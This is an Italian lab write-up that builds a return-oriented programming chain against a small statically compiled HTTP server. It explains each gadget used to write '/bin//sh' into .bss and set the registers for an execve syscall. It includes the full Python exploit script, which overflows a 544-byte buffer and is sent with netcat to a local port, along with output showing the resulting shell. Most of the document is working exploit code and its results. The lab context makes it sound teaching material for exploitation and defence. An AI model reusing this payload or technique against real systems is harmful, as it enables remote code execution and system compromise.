# ROP Exploit

- compilazione con flag `-static`;
- stack-protectors disabilitati;
- ASLR abilitato.

Partendo dai precedenti lab è stata creata la seguente ROP Chain che permette di eseguire la systemcall `execve("/bin/sh", 0, 0)`.

La ROP Chain è stata costruita usando solamente gadget presenti nella sezione `.text` del programma in modo da eludere la ASLR (il programma è stato compilato con il flag `-static` per aumentare la quantità di gadget presenti, essendo il programma di dimensioni ridotte).

## Sviluppo ROP Chain

### Obiettivo

Effettuare syscall `execve("/bin/sh", 0, 0)` - il cui numero è `0xb` - per eseguire shell. 

Occorre quindi:
- `eax = 0xb`: `eax` contiente numero syscall da effettuare una volta effettuato
  interrupt `int 0x80`;
- `ebx`: dovrà puntare all'indirizzo di memoria di inizio della stringa "/bin/sh";
- `ecx`: usato per puntare a array argomenti; non usato in questo caso, quindi il suo
  valore sarà `0x0`;
- `edx`: usato per putare a array veriabili d'ambiente; non usato in questo caso,
  quindi sarà `0x0`.
- trovare ed usare gadget `int 0x80` per effettuare systemcall.

### Descrizione gadget usati

#### Scrittura di "/bin/sh" in memoria

Per prima cosa è stata scritta la stringa "/bin/sh" in memoria, al fine di riutilizzara in seguito durante la systemcall.

I gadget e i valori utilizzati a tal proposito:

```
pop_edx = 0x0807662a  # pop edx; ret
pop_eax = 0x080bc865  # pop eax; ret
mov_mem = 0x080562ab  # mov dword ptr [edx], eax ; ret


write_1 = 0x080f1010  # .bss start address
write_2 = 0x080f1014  # .bss start address + 4
```

`write_1` è l'indirizzo di memoria scelto in cui inziare a scrivere "/bin/sh"; è stato scelto
l'inizio della sezione `.bss` in quanto scrivibile e per evitare di andare a sovrascrivere
la sezione `.text`.

In `write_1` saranno scritti i primi 4 byte "/bin", mentre in `write_2` la seconda parte
"//sh" (è stato scritto "//sh" per evitare null byte; a livello bash la prima "/" sarà ignorata).

Chain di scrittura "/bin/sh":
```
payload += p(pop_edx)		# EDX will point to .bss start 
payload += p(write_1)
payload += p(pop_eax)		# writes "/bin" in EAX
payload += "/bin"
payload += p(mov_mem)		# moves EAX="/bin" at address pointed by EDX (.bss start)
payload += p(pop_edx)
payload += p(write_2)		# EDX will point at .bss start + 4
payload += p(pop_eax)		# writes "//sh" in EAX
payload += "//sh"
payload += p(mov_mem)		# moves EAX="//sh" at address pointed by EDX (.bss start + 4)
```

Per prima cosa è stato utilizzato `pop_edx` per inserire `write_1` in `edx` (`pop edx`).

La catena prosegue saltando al gadget `pop_eax` (grazie alla `ret` che inserisce l'indirizzo del gadget successivo
nel PC) attraverso cui viene scritta la stringa "/bin" nel registro `eax`. 

Il terzo elemento della catena è `mov_mem`, che permette di scrivere il contenuto di `eax` nell'indirizzo puntato da `edx`, ovvero `write_1`. In questo modo la prima
parte di "/bin/sh" sarà scritta nella sezione di memoria scelta.

La chain prosegue in maniera analoga per scrivere "//sh", sfruttando gli stessi gadget.

Alla fine della chain "/bin/sh" sarà scritto all'indirizzo di memoria `write_1`.

#### EDX=0 e EBX->"/bin//sh"

```
xor_eax = 0x0804a3c3	# xor eax, eax ; ret
xor_edx = 0x08098280	# xor edx, edx ; div esi ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret

```

Chain usata:
```
payload += p(xor_eax)		# EAX = 0
payload += p(xor_edx)		# EDX=0; EBX = address of "/bin//sh"
payload += p(write_1)
payload += "JUNK" * 3
```

il gadget `xor_edx` è stato usato per azzerare il registro `edx`. Tuttavia, la presenza
dell'istruzione `div esi` rende necessario azzerare prima il registro `eax` poichè l'istruzione
effettua la divisione tra `eax` e `esi`, mettendo il risultato in `eax` e il resto della divisione
in `edx`.

Quindi, settando prima `eax=0x0`, il risultato della divisione sarà 0 con resto 0 e
ed entrambi i registri `eax` e `edx` conterranno `0x0`.

Inoltre, nel gadget `xor_edx` è presente l'istruzione `pop ebx`, che sarà sfruttata per inserire
l'indirizzo `write_1` (che contiene "/bin//sh") nel regitro `ebx`.

#### ECX=0

```
mov_ecx = 0x0805e319	# mov ecx, edx ; rep stosb byte ptr es:[edi], al ; mov eax, dword ptr [esp + 8] ; pop edi ; ret

```

Chain usata:
```
payload += p(mov_ecx)		# ECX = 0
payload += "JUNK"
```

il gadget `mov_ecx` è stato usato per copiare il contenuto di `edx` in `ecx`, ovvero `0x0`.

#### EAX=0xb

```
pop_edx = 0x0807662a    # pop edx; ret
pop_eax = 0x080bc865    # pop eax; ret
sub_eax = 0x080562dc    # sub eax,edx; ret

execve_num1 = 0x4141411b
execve_num2 = 0x41414110	# (execve_num1 - execve_num2) = 0xb; avoiding null bytes

```

Chain usata:

```
payload += p(pop_edx)
payload += p(execve_num2)	# EDX=0x41414110
payload += p(pop_eax)
payload += p(execve_num1)	# EAX=0x4141411b
payload += p(sub_eax)		# EAX = EAX - EDX = 0xb

```

`pop_edx` e `pop_eax` vengono usati per inserire in `edx` e `eax` rispettivamente
i valori `0x41414110` e `0x4141411b`.

`sub_eax` viene quindi usato per fare la sottrazzione tra `eax` e `edx`, memorizzando
il risultato in `eax`, quindi `eax=0xb`.

Non è stato inserito direttamente il valore `0x0000000b` poichè contiene null byte.

#### EDX=0

```
mov_edx = 0x08055b85	# mov edx, 0xffffffff ; ret
inc_edx = 0x0805eca7	# inc edx ; ret

```

Chain usata:
```
payload += p(mov_edx)		# EDX=0xffffffff
payload += p(inc_edx)		# INC EDX -> EDX = 0

```

`mov_edx` viene usato per inserire `0xffffffff` in `edx`, mentre `inc_edx` incrementa
`edx` di 1, portando `edx=0x0`.


#### INT 0x80

```
int_80  = 0x0804e9f5	# int 0x80

```

Chain usata:
```
payload += p(int80)		#call execve()

```

## Esecuzione exploit completo

vedi file `execve.py`.

```
import os
import struct
import urllib

def p(x):
  return struct.pack('<I', x)

# Gadgets
xor_edx = 0x08098280	# xor edx, edx ; div esi ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
xor_eax = 0x0804a3c3	# xor eax, eax ; ret
mov_ecx = 0x0805e319	# mov ecx, edx ; rep stosb byte ptr es:[edi], al ; mov eax, dword ptr [esp + 8] ; pop edi ; ret
pop_edx = 0x0807662a    # pop edx; ret
pop_eax = 0x080bc865    # pop eax; ret
sub_eax = 0x080562dc    # sub eax,edx; ret
mov_mem = 0x080562ab 	# mov dword ptr [edx], eax ; ret
mov_edx = 0x08055b85	# mov edx, 0xffffffff ; ret
inc_edx = 0x0805eca7	# inc edx ; ret
int_80  = 0x0804e9f5	# int 0x80

# Values
execve_num1 = 0x4141411b
execve_num2 = 0x41414110	# (execve_num1 - execve_num2) = 0xb; avoiding null bytes
write_1 = 0x080f1010		# used for writing "/bin" to .bss start address
write_2 = 0x080f1014		# used for writing "//sh" to .bss start + 4

# ROP Chain
payload = "A"*544		    # fill the buffer
payload += "BBBB"		    # EBP overwrite
payload += p(pop_edx)		# point EDX to .bss start
payload += p(write_1)
payload += p(pop_eax)		# put "/bin" into EAX
payload += "/bin"
payload += p(mov_mem)		# move EAX="/bin" to address pointed by EDX (.bss start)
payload += p(pop_edx)
payload += p(write_2)		# point to .bss start + 4
payload += p(pop_eax)		# put "//sh" into EAX
payload += "//sh"
payload += p(mov_mem)		# move EAX="//sh" to address pointed by EDX (.bss start + 4)
payload += p(xor_eax)		# EAX = 0; needed because of "div esi" into next gadget (div esi puts division results into EAX and EDX, and we want EDX=0)
payload += p(xor_edx)		# EDX=0; EBX = address of "/bin//sh"
payload += p(write_1)
payload += "JUNK" * 3
payload += p(mov_ecx)		# ECX = 0
payload += "JUNK"
payload += p(pop_edx)
payload += p(execve_num2)	# EDX=0x41414110
payload += p(pop_eax)
payload += p(execve_num1)	# EAX=0x4141411b
payload += p(sub_eax)		# EAX = EAX - EDX = 0xb
payload += p(mov_edx)		# EDX=0xffffffff
payload += p(inc_edx)		# INC EDX -> EDX = 0
payload += p(int_80)		#call execve()


print "GET /" + urllib.quote_plus(payload) + "\r\n"

``` 

Esecuzione dell'exploit:
`python execve.py | nc localhost 9999`

Risultato:
```
./tiny_static 
listen on port 9999, fd is 3
child pid is 11992
accept request, fd is 4, pid is 11992
141.180.38.0:50064 404 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA5?
                                                  ?????
$ uname -a
Linux  ghost 4.13.0-26-generic #29~16.04.2-Ubuntu SMP Tue Jan 9 22:00:44 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```